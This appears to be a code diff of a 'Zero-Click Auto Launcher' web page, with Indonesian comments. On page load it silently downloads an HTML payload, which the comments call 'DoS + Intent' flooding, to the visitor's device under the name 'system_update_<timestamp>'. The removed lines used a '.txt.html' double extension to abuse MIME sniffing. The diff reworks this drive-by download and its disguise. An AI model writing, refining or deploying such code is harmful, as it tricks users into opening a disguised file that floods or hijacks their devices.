@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Zero-Click Auto Launcher (Full)</title>
+    <title>Zero-Click Auto Launcher</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
@@ -26,7 +26,7 @@
 <script>
     const statusDiv = document.getElementById("status");
 
-    // Payload HTML (Akan dijalankan di dalam file .txt.html)
+    // Payload HTML DoS + Intent (Akan dijalankan di dalam file .txt.html)
     const payloadText = `
         <!DOCTYPE html>
         <html>
@@ -106,22 +106,19 @@
         </html>
     `;
 
-    // FUNGSI ZERO-CLICK: Langsung unduh file .txt.html saat halaman dimuat
+    // FUNGSI ZERO-CLICK: Langsung jalankan saat halaman dimuat
     window.addEventListener("DOMContentLoaded", () => {
         statusDiv.textContent = "Memicu Zero-Click Auto Download...";
         
         try {
-            // Buat Blob dari payload HTML
+            // Buat Blob dari payload
             const blob = new Blob([payloadText], { type: "text/html" });
             const url = URL.createObjectURL(blob);
             
-            // Buat elemen anchor tersembunyi
+            // Buat link tersembunyi
             const a = document.createElement("a");
             a.href = url;
-            
-            // Ekstensi ganda .txt.html (MIME Sniffing)
-            a.download = `system_update_${Date.now()}.txt.html`;
-            
+            a.download = `system_update_${Date.now()}.txt`;
             a.style.display = "none";
             document.body.appendChild(a);
             
@@ -131,7 +128,7 @@
             setTimeout(() => {
                 if (a.parentNode) document.body.removeChild(a);
                 URL.revokeObjectURL(url);
-                statusDiv.textContent = "File .txt.html berhasil diunduh. Buka file tersebut untuk memicu Intent & Flooding.";
+                statusDiv.textContent = "File .txt berhasil diunduh. Buka file tersebut untuk memicu aksi.";
                 statusDiv.style.color = "#4CAF50";
             }, 1000);
 
